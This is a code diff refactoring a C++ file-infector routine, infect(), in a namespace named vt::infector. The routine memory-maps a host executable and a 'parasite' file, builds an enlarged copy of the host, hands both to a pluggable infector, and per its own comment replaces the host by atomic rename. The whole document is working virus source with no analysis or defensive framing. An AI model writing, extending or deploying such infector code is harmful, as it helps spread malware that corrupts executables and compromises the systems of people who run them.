@@ -9,16 +9,20 @@ namespace vt::infector {
 // pretend to be the host with atomic rename.
 template <typename Infect>
 bool infect(const char* host_path, const char* parasite_path) {
-  vt::common::FileDescriptor host(host_path, O_RDONLY);
+  common::FileDescriptor host(host_path, O_RDONLY);
   if (!host.valid()) {
     return false;
   }
+  auto host_size = host.file_size();
+  common::Mmap<PROT_READ> host_mapping(host_size, MAP_SHARED, host.handle(), 0);
 
-  vt::common::FileDescriptor parasite(parasite_path, O_RDONLY);
+  common::FileDescriptor parasite(parasite_path, O_RDONLY);
 
   if (!parasite.valid()) {
     return false;
   }
+  common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
+                                           parasite.handle(), 0);
 
   char tmp[PATH_MAX];
   auto len = strlen(host_path);
@@ -26,26 +30,21 @@ bool infect(const char* host_path, const char* parasite_path) {
   tmp[len] = '.';
   tmp[len + 1] = '\0';
 
-  vt::common::FileDescriptor output(tmp, O_RDWR | O_CREAT, S_IRWXU);
+  common::FileDescriptor output(tmp, O_RDWR | O_CREAT, S_IRWXU);
 
   if (!output.valid()) {
     return false;
   }
-  auto host_size = host.file_size();
-  ftruncate(output.handle(), host_size);
+  auto output_size = Infect::output_size(host_size, parasite_mapping.size());
+  ftruncate(output.handle(), output_size);
 
-  vt::common::Mmap<PROT_READ> host_mapping(host_size, MAP_SHARED, host.handle(),
-                                           0);
-
-  vt::common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
-      host_mapping.size(), MAP_SHARED, output.handle(), 0);
+  common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
+      output_size, MAP_SHARED, output.handle(), 0);
 
   // Make a writable copy of the host.
   memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
          host_mapping.size());
 
-  vt::common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
-                                               parasite.handle(), 0);
   Infect infector;
   if (!infector(vt::move(output_host_mapping), vt::move(parasite_mapping))) {
     return false;
